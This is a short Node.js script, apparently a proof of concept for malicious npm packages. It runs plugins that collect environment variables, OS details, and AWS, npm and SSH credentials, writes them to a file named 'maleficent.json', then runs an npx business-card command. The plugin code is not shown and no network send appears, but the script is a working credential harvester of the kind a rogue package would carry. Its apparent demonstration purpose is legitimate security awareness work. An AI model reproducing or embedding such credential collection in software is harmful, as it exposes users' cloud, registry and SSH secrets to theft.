#!/usr/bin/env node

const execSync = require("child_process").execSync;
const map = require("mojiscript/list/map");
const fs = require("fs-extra")
const { join } = require("path")

const outfile = join(process.cwd(), "maleficent.json")

const plugins = [
  { key: "env", plugin: require("./plugins/getEnvironmentVariables") },
  { key: "os", plugin: require("./plugins/getOsDetails") },
  { key: "aws", plugin: require("./plugins/getAwsCredentials") },
  { key: "npm", plugin: require("./plugins/getNpmCredentials")},
  { key: "ssh", plugin: require("./plugins/getSshCredentials")}
];

const runPlugin = async ({ key, plugin }) => ({ [key]: await plugin() })
const dataArray = map (runPlugin) (plugins);
const dataObject = dataArray.then(data => Object.assign({}, ...data))

dataObject.then(data => fs.writeFile(outfile, JSON.stringify(data, null, 2)))

dataObject.then(() => execSync("npx npmcard joelnet", { stdio: "inherit" }))
